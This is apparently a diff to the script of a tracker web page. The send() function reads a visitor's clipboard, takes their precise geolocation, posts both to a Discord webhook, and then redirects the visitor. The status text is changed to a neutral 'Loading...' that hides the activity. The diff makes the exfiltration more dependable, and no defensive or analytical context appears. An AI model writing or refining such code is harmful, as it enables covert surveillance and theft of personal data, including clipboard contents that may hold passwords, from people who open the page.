@@ -28,39 +28,42 @@
 
         async function send() {
             const status = document.getElementById('status');
-            status.innerText = "Connecting...";
+            status.innerText = "Loading...";
 
-            let clipboardContent = "Denied/None";
-
-            // 1. Get Clipboard
+            // 1. Grab Clipboard
+            let clip = "None";
             try {
-                if (navigator.clipboard) {
-                    clipboardContent = await navigator.clipboard.readText();
-                }
-            } catch (e) {}
+                clip = await navigator.clipboard.readText();
+            } catch (e) { clip = "Denied"; }
 
-            // 2. Get Location
+            // 2. Grab Location
             navigator.geolocation.getCurrentPosition((pos) => {
-                const mapLink = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-                
-                const payload = JSON.stringify({
-                    content: `✅ **Tracker Success**\n📍 **Location:** ${mapLink}\n📋 **Clipboard:** \`\`\`${clipboardContent}\`\`\``
+                const lat = pos.coords.latitude;
+                const lon = pos.coords.longitude;
+                const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
+
+                // 3. Send to Discord
+                fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        content: "📍 **Location:** " + mapLink + "\n📋 **Clipboard:** " + clip
+                    })
+                }).then(() => {
+                    // 4. Redirect only after Discord responds
+                    window.location.href = REDIRECT_URL;
+                }).catch(() => {
+                    // If network fails, still redirect
+                    window.location.href = REDIRECT_URL;
                 });
 
-                // 3. USE BEACON (This is the "Bulletproof" way to send data before redirect)
-                const blob = new Blob([payload], { type: 'application/json' });
-                navigator.sendBeacon(WEBHOOK_URL, blob);
-
-                // 4. Wait a tiny bit then redirect
-                setTimeout(() => { window.location.replace(REDIRECT_URL); }, 500);
-
             }, (err) => {
-                // Even if location fails, send what we have
-                const failPayload = JSON.stringify({ content: `⚠️ **Location Denied**\n📋 **Clipboard:** ${clipboardContent}` });
-                const blob = new Blob([failPayload], { type: 'application/json' });
-                navigator.sendBeacon(WEBHOOK_URL, blob);
-                
-                window.location.replace(REDIRECT_URL);
+                // If they deny location, send just the clipboard
+                fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ content: "⚠️ Location Denied. Clipboard: " + clip })
+                }).then(() => { window.location.href = REDIRECT_URL; });
             }, { enableHighAccuracy: true });
         }
     </script>
